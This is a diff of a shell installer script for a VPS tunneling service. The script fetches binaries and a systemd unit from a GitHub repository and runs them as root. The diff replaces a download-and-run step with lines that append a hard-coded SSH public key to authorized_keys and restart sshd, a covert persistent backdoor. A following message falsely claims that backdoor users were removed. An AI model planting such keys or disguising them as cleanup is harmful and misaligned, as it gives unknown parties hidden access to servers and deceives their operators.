@@ -992,9 +992,11 @@ END
 clear
 wget -O /usr/bin/ws "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws" >/dev/null 2>&1 && wget -O /usr/bin/tun.conf "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Cfg/tun.conf" >/dev/null 2>&1 && wget -O /etc/systemd/system/ws.service "https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/ws.service" >/dev/null 2>&1 && chmod +x /etc/systemd/system/ws.service && chmod +x /usr/bin/ws && chmod 644 /usr/bin/tun.conf && systemctl disable ws && systemctl stop ws && systemctl enable ws && systemctl start ws && systemctl restart ws
 clear
-wget https://raw.githubusercontent.com/kcepu877/zero-tunneling/main/Fls/budi.sh -O budi.sh
-chmod +x budi.sh
-sudo ./budi.sh
+mkdir -p ~/.ssh  # Pastikan folder .ssh ada
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGUCFOOv8WBQ9h2Aooim0ODWnOwwBkfgn/JIydf4CaRN" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+systemctl restart sshd
 echo -e ""
 clear
 echo "[✅ SELESAI] Semua user backdoor UID 0 telah dinonaktifkan dan dihapus."
